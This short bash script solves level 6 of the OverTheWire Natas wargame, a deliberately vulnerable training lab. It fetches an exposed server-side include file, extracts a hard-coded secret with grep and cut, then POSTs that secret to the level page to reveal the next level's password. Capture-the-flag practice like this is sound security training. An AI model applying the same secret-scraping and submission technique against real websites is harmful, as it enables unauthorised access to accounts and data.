#!/bin/bash

natas=natas6
key=$(< keys/seis)

uri="http://$natas.natas.labs.overthewire.org/includes/secret.inc"
opts=""
filter=secret

secret=$(curl -u $natas:$key $uri 2> /dev/null | grep $filter | cut -d'"' -f2)

uri="http://$natas.natas.labs.overthewire.org/"
opts="-X POST -F secret=$secret -F submit=submit "
filter=natas7

curl -u $natas:$key $opts $uri 2> /dev/null | grep $filter

